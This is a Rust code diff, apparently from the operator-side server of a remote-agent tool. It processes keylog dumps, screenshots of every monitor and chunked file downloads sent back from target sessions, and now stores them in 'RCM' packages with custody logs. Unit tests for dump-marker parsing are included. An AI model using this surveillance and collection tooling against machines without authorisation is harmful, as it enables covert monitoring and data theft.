-    if r.output.contains("SCREENSHOT_DUMP:") {
-        // ext:load wraps the return value as "JOB_FINAL:<id>|SCREENSHOT_DUMP:<json>"
-        // so we cannot use starts_with — extract everything after the prefix instead.
-        let content = r.output
-            .splitn(2, "SCREENSHOT_DUMP:")
-            .nth(1)
-            .unwrap_or("")
-            .to_string();
-        let sess_id_copy = sess_id;
-        // Capture session metadata for the provenance file.
-        // Use the database rather than the sessions map because sessions may
-        // have been moved into a preceding spawn and is not available here.
-        let (snap_hostname, snap_os, snap_ip) = if let Ok(ref conn) = db.get() {
-            conn.query_row(
-                "SELECT hostname, os, ip_address FROM sessions WHERE id = ?1",
-                rusqlite::params![sess_id],
-                |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, String>(2)?))
-            ).unwrap_or_default()
-        } else {
-            (String::new(), String::new(), String::new())
-        };
+    // Same anchoring rule as KEYLOG_DUMP: only a real dump (marker at the
+    // start, or inside the JOB_FINAL:<id>| wrapper) is intercepted.
+    let screenshot_payload = extract_dump_payload(&r.output, "SCREENSHOT_DUMP").map(str::to_string);
+    if let Some(content) = screenshot_payload {
+        let db_ss = db.clone();
 
         let screenshot_result = tokio::task::spawn_blocking(move || -> Result<(String, usize), String> {
-            let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
-            let folder_name = format!("{}_{}_{}", timestamp, sess_id_copy, "screenshot");
-            let base_path = Path::new("downloads").join(&folder_name);
-            fs::create_dir_all(&base_path).map_err(|e| e.to_string())?;
+            let pkg = package_for_session(&db_ss, sess_id)
+                .ok_or_else(|| "no RCM package for session".to_string())?;
+            // One capture timestamp shared by the whole dump (Sec-11).
+            let captured_at = Utc::now();
 
             let mut count = 0;
             // Use typed deserialization instead of generic serde_json::Value.
@@ -696,141 +1203,105 @@ async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResu
             }
             if let Ok(entries) = serde_json::from_str::<Vec<ScreenshotEntry>>(&content) {
                 // Track how many frames we've seen per monitor index so
-                // multiple historical frames for the same monitor don't
-                // overwrite each other (only the last one would survive).
+                // multiple frames for the same monitor get distinct
+                // toolspecific names (monitor<idx>, monitor<idx>_frame<n>).
                 let mut frame_counts: std::collections::HashMap<u64, u32> = std::collections::HashMap::new();
                 for entry in entries {
                     if let (Some(idx), Some(b64)) = (entry.monitor_index, entry.b64) {
                         if let Ok(bytes) = BASE64.decode(b64) {
                             let frame = frame_counts.entry(idx).or_insert(0);
-                            let filename = if *frame == 0 {
-                                format!("monitor_{}.png", idx)
+                            let toolspecific = if *frame == 0 {
+                                format!("monitor{}", idx)
                             } else {
-                                format!("monitor_{}_frame{}.png", idx, frame)
+                                format!("monitor{}_frame{}", idx, frame)
                             };
                             *frame += 1;
-                            if fs::write(base_path.join(&filename), bytes).is_ok() {
-                                count += 1;
+                            let meta = rcm_screenshot_meta(captured_at, toolspecific,
+                                Some(idx.to_string()));
+                            match pkg.store_screenshot(&bytes, &meta) {
+                                Ok(_) => count += 1,
+                                Err(e) => {
+                                    let _ = pkg.log("agent", "ERROR",
+                                        &format!("screenshot store failed: {}", e));
+                                }
                             }
                         }
                     }
                 }
             }
-            // Write provenance metadata matching the convention used by
-            // file_transfer::save_batch_report — same structure the loot
-            // browser renders for downloaded files.
-            let metadata = serde_json::json!({
-                "type":       "screenshot",
-                "session_id": sess_id_copy,
-                "hostname":   snap_hostname,
-                "os":         snap_os,
-                "ip":         snap_ip,
-                "timestamp":  timestamp,
-                "count":      count,
-                "files":      (0..count as u64).map(|i| format!("monitor_{}.png", i)).collect::<Vec<_>>(),
-            });
-            let meta_name = format!("{}_{}_{}_metadata.json", timestamp, sess_id_copy, "screenshot");
-            let _ = fs::write(base_path.join(&meta_name),
-                              serde_json::to_string_pretty(&metadata).unwrap_or_default());
+            // Provenance is carried by the Sec-11 sidecars; no metadata json.
+            // Record custody + package log ONLY when at least one frame was
+            // actually stored - garbage JSON must not mint custody claims.
+            if count > 0 {
+                let _ = pkg.custody("rcm-server", rcm::custody::CustodyAction::Collect,
+                    None, Some(&format!("Captured {} screenshot frame(s)", count)));
+                let _ = pkg.log("agent", "INFO",
+                    &format!("screenshot dump captured ({} frames)", count));
+            }
 
-            Ok((folder_name, count))
+            Ok((format!("downloads/{}/output/screenshots", pkg.root_name()), count))
         }).await;
 
         let msg = match screenshot_result {
-            Ok(Ok((folder_name, count))) => format!("Saved {} screenshots to: downloads/{}", count, folder_name),
+            Ok(Ok((folder, count))) => format!("Saved {} screenshots to: {}", count, folder),
             _ => "Screenshot extraction failed".to_string(),
         };
         println!("\n[+] {}", msg);
 
+        // Operator-facing results map gets the extraction status; the DB
+        // keeps the ORIGINAL raw dump output so the payload is not lost.
+        let raw_output = r.output.clone();
         let mut modified_response = r.clone();
         modified_response.output = msg;
-        let log_output = modified_response.output.clone();
         let log_error = modified_response.error.clone();
 
         results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), modified_response);
         let db_inner = db.clone();
         tokio::task::spawn_blocking(move || {
             if let Ok(conn) = db_inner.get() {
-                database::save_client_output(&conn, sess_id, r.request_id, &log_output, &log_error);
+                database::save_client_output(&conn, sess_id, r.request_id, &raw_output, &log_error);
             }
         });
         return;
     }
     // -------------------------------------
 
-    // file:chunk — one piece of a chunked large-file transfer.
-    // Format: file:chunk|<batch_ts>|<root_name>|<rel_path>|<chunk_idx>|<total_chunks>|<b64_data>
-    //   7 fields, 6 pipe separators → splitn(7) gives exactly 7 parts, b64 at parts[6].
-    // BUG HISTORY: the original code used splitn(8)/len==8/parts[7], which is always
-    // false (only 6 pipes exist) so every chunk was silently dropped.
-    if r.output.starts_with("file:chunk|") {
-        let parts: Vec<&str> = r.output.splitn(7, '|').collect();
-        if parts.len() == 7 {
-            let (batch_ts, root, rel) = (parts[1], parts[2], parts[3]);
-            // Parse as u64 — agent uses u64 to handle files >4 GB on 32-bit targets.
-            let chunk_idx    = parts[4].parse::<u64>().unwrap_or(0);
-            let total_chunks = parts[5].parse::<u64>().unwrap_or(1);
-            let b64_data     = parts[6];
-            match file_transfer::save_file_chunk(batch_ts, sess_id, root, rel, chunk_idx, total_chunks, b64_data) {
-                Ok(is_final) => {
-                    if is_final {
-                        info!(sess_id, file = rel, chunks = total_chunks, "Chunked download complete");
-                        file_transfer::append_progress(batch_ts, sess_id, root,
-                            &format!("Downloaded: {} ({} chunks)", rel, total_chunks));
-                    }
-                }
-                Err(e) => {
-                    error!(sess_id, file = rel, chunk = chunk_idx, error = %e, "Chunk save failed");
-                    file_transfer::append_progress(batch_ts, sess_id, root,
-                        &format!("FAILED chunk {}/{} for {}: {}", chunk_idx, total_chunks, rel, e));
-                }
-            }
-        }
-        return;
-    }
+    // file: family - collected-file storage goes through the RCM package
+    // (SPEC §4/§5). The output may contain MULTIPLE newline-separated
+    // messages (the agent prefixes file:meta|... before file:data|...), and
+    // a buggy/hostile agent can mix plain output in - so run EVERY line
+    // through the wire-prefix detector. Lines matching a known wire message
+    // are dispatched; everything else FALLS THROUGH to the normal output
+    // path below (results map + DB + println) instead of vanishing.
+    if r.output.starts_with("file:") {
+        let (wire_lines, plain_lines) = partition_wire_lines(&r.output);
 
-    if r.output.starts_with("file:data|") {
-        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
-        if parts.len() == 4 {
-            match file_transfer::save_download_with_metadata(sess_id, parts[1], parts[3], parts[2]) {
-                Ok(m) => {
-                    info!(sess_id, file = parts[1], "File Downloaded Successfully");
-                    println!("\n[+] Single Download: {}", m);
-                },
-                Err(e) => {
-                    error!(sess_id, file = parts[1], error = %e, "File Download Failed");
-                    println!("\n[-] Save Error: {}", e);
-                }
+        // All dispatch work (r2d2 pool get, SQLite session lookup, package
+        // file I/O with sync_all) is blocking: run the ENTIRE multi-line
+        // dispatch in ONE spawn_blocking, resolving the package ONCE per
+        // response and reusing it for every line, and await the join before
+        // returning so ordering vs. subsequent processing is preserved.
+        let db_f = db.clone();
+        // The transfer identity for all chunked stores of this response
+        // (recursive + single-file chunked share it - slots are per-path).
+        // Namespaced by session: request ids are per-session counters
+        // starting at 1, so two sessions of the SAME target issuing
+        // same-path downloads would otherwise collide and mix their
+        // .part slots (':' passes rcm's validate_transfer_id).
+        let transfer_id = format!("{}:{}", sess_id, r.request_id);
+        let _ = tokio::task::spawn_blocking(move || {
+            let pkg = package_for_session(&db_f, sess_id);
+            for line in &wire_lines {
+                handle_file_line(sess_id, line, pkg.as_ref(), &transfer_id);
             }
-        }
-        return;
-    } 
-    
-    if r.output.starts_with("file:data_batch|") {
-        let parts: Vec<&str> = r.output.splitn(6, '|').collect();
-        if parts.len() == 6 {
-            let (batch_ts, root, rel, b64) = (parts[1], parts[2], parts[3], parts[5]);
-            match file_transfer::save_batch_file(batch_ts, sess_id, root, rel, b64) {
-                Ok(_) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("Downloaded: {}", rel)); },
-                Err(e) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("FAILED: {} - {}", rel, e)); }
-            }
-        }
-        return;
-    }
+        }).await;
 
-    if r.output.starts_with("file:report_batch|") {
-        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
-        if parts.len() == 4 {
-            let (batch_ts, root, json) = (parts[1], parts[2], parts[3]);
-            match file_transfer::save_batch_report(batch_ts, sess_id, root, json) {
-                Ok(path) => { 
-                    info!(sess_id, batch = root, report = path, "Batch Download Complete");
-                    println!("\n[+] Batch Complete: {}\n[+] Report: {}", root, path); 
-                },
-                Err(e) => println!("[-] Report Error: {}", e),
-            }
+        if plain_lines.is_empty() {
+            return;
         }
-        return;
+        // Non-wire lines continue through the normal pipeline below as if
+        // they had been the command's output.
+        r.output = plain_lines.join("\n");
     }
 
     // --- JOB SYSTEM: Streamed output chunks ---
@@ -882,9 +1353,126 @@ async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResu
 
     if !r.error.is_empty() {
         error!(sess_id, req_id = r.request_id, exit_code = r.exit_code, error = %r.error, "Command Failed");
-        println!("\n[-] Session {} Error (Exit {}): {}", sess_id, r.exit_code, r.error);
+        println!("\n[-] Session {} Error (Exit {}): {}", sess_id, r.exit_code, crate::utils::strip_ansi(&r.error));
     } else if !r.output.trim().is_empty() {
         info!(sess_id, req_id = r.request_id, output = %r.output.trim(), "Command Output Received");
         println!("\n[Sess {} Output]\n{}", sess_id, crate::utils::strip_ansi(r.output.trim()));
+    }
+}
+
+
+#[cfg(test)]
+mod tests {
+    use super::{partition_wire_lines, extract_dump_payload, os_fingerprint_entry};
+
+    #[test]
+    fn dump_payload_accepted_at_output_start() {
+        assert_eq!(
+            extract_dump_payload("KEYLOG_DUMP:{\"a\":1}", "KEYLOG_DUMP"),
+            Some("{\"a\":1}")
+        );
+        assert_eq!(
+            extract_dump_payload("SCREENSHOT_DUMP:[]", "SCREENSHOT_DUMP"),
+            Some("[]")
+        );
+    }
+
+    #[test]
+    fn dump_payload_accepted_inside_job_final_wrapper() {
+        // ext:load wraps results as JOB_FINAL:<id>|<MARKER>:<payload>.
+        assert_eq!(
+            extract_dump_payload("JOB_FINAL:7|KEYLOG_DUMP:line1\nline2", "KEYLOG_DUMP"),
+            Some("line1\nline2")
+        );
+        assert_eq!(
+            extract_dump_payload("JOB_FINAL:42|SCREENSHOT_DUMP:[{}]", "SCREENSHOT_DUMP"),
+            Some("[{}]")
+        );
+    }
+
+    #[test]
+    fn dump_payload_rejects_mere_substring_mentions() {
+        // Ordinary shell output mentioning the marker must NOT be hijacked.
+        assert_eq!(extract_dump_payload("the KEYLOG_DUMP: marker is x", "KEYLOG_DUMP"), None);
+        assert_eq!(extract_dump_payload("echo SCREENSHOT_DUMP:", "SCREENSHOT_DUMP"), None);
+        // Crafted suffixes must not mint artifacts either.
+        assert_eq!(extract_dump_payload("hello\nKEYLOG_DUMP:{\"a\":1}", "KEYLOG_DUMP"), None);
+        assert_eq!(extract_dump_payload("JOB_FINAL:7|junk KEYLOG_DUMP:x", "KEYLOG_DUMP"), None);
+        // JOB_FINAL without a pipe, or wrapping a different payload.
+        assert_eq!(extract_dump_payload("JOB_FINAL:7 KEYLOG_DUMP:x", "KEYLOG_DUMP"), None);
+        assert_eq!(extract_dump_payload("JOB_FINAL:7|plain output", "KEYLOG_DUMP"), None);
+        // Wrong marker.
+        assert_eq!(extract_dump_payload("SCREENSHOT_DUMP:[]", "KEYLOG_DUMP"), None);
+    }
+
+    #[test]
+    fn dump_payload_empty_is_some_not_none() {
+        // An empty dump is still a dump - the caller must complete the
+        // request (not hang the output poller).
+        assert_eq!(extract_dump_payload("KEYLOG_DUMP:", "KEYLOG_DUMP"), Some(""));
+        assert_eq!(extract_dump_payload("JOB_FINAL:1|KEYLOG_DUMP:  ", "KEYLOG_DUMP"), Some("  "));
+    }
+
+    #[test]
+    fn os_fingerprint_entry_matches_spec_5_3_shape() {
+        let e = os_fingerprint_entry("HOST-A", "Windows 10", "cid-123");
+        assert_eq!(e.target, "machine");
+        assert_eq!(e.fp_type, "os");
+        assert_eq!(e.version, 1);
+        assert_eq!(e.uid, None);
+        assert_eq!(
+            e.fields,
+            vec![
+                ("hostname".to_string(), "HOST-A".to_string()),
+                ("osversion".to_string(), "Windows 10".to_string()),
+                ("usertag".to_string(), "NONE".to_string()),
+                ("private_rcm_computerid".to_string(), "cid-123".to_string()),
+            ]
+        );
+    }
+
+    #[test]
+    fn partition_separates_wire_and_plain_lines() {
+        let out = "file:meta|-|a|b|e30=\nplain output line\nfile:data|/x|644|AAAA\nfile:unknown-thing\nfile:chunk|b|r|f|0|1|AAAA";
+        let (wire, plain) = partition_wire_lines(out);
+        assert_eq!(wire, vec![
+            "file:meta|-|a|b|e30=".to_string(),
+            "file:data|/x|644|AAAA".to_string(),
+            "file:chunk|b|r|f|0|1|AAAA".to_string(),
+        ]);
+        // Unknown "file:"-ish lines fall through as plain output instead of
+        // being silently swallowed.
+        assert_eq!(plain, vec!["plain output line", "file:unknown-thing"]);
+    }
+
+    #[test]
+    fn partition_recognizes_all_known_wire_prefixes() {
+        for line in [
+            "file:meta|a|b|c|e30=",
+            "file:data_batch|b|r|f|644|AAAA",
+            "file:data|/x|644|AAAA",
+            "file:chunk|b|r|f|0|1|AAAA",
+            "file:report_batch|b|r|{}",
+        ] {
+            let (wire, plain) = partition_wire_lines(line);
+            assert_eq!(wire.len(), 1, "{} should classify as wire", line);
+            assert!(plain.is_empty(), "{} should leave no plain lines", line);
+        }
+    }
+
+    #[test]
+    fn partition_treats_plain_text_as_plain_even_with_file_prefix_colon() {
+        // "file: " (with a space) is not a wire prefix.
+        let (wire, plain) = partition_wire_lines("file: not-a-wire-line\nsecond line");
+        assert!(wire.is_empty());
+        assert_eq!(plain, vec!["file: not-a-wire-line", "second line"]);
+    }
+
+    #[test]
+    fn partition_data_batch_not_confused_with_data() {
+        // Both share the "file:data" stem; field count differs.
+        let (wire, plain) = partition_wire_lines("file:data_batch|b|r|f|644|AAAA");
+        assert_eq!(wire.len(), 1);
+        assert!(plain.is_empty());
     }
 }
